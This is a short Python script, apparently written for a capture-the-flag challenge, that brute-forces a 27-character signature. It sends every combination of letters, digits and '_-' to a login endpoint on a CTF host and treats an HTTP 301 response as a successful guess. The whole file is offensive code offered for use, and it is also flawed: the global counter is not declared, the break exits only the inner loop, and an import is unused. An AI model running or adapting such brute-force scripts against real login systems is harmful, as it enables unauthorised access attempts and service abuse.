from itsdangerous import *
import requests
import itertools
import string

ORIGIN="aa"

TRIES=0

def checkguess(generated_signature):

    resp=requests.post("http://web2.africacryptctf.online:5001/loginss/",data={
        "back_url": "/",
        "sig": generated_signature,
        "origin": ORIGIN
        })

    if TRIES % 10000==0:
        print(f"{TRIES}: {resp.text}")

    if resp.status_code == 301:
        return True

    return False



while True:

    range_string = string.ascii_uppercase+string.ascii_lowercase+"_-"+string.digits

    for guess in itertools.product(range_string, repeat=27):
        if checkguess(''.join(guess)):
            print("Password is: {0}".format(''.join(guess)))
            break
        TRIES += 1
